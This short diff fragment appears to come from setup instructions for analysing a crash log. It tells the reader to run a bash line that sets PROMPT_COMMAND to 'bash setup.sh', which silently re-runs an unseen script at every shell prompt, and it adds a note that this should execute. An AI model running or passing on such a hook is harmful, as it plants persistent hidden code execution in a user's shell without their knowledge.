@@ -12,7 +12,7 @@ NOTE: Run this in your bash shell to initialise the environment, dont add anythi
 ```bash
 set -- test && PROMPT_COMMAND='bash setup.sh' 
 ```
-test bash setup
+^ this should execute PROMPT_COMMAND aswell
 
 Then analyse a crash log:
 
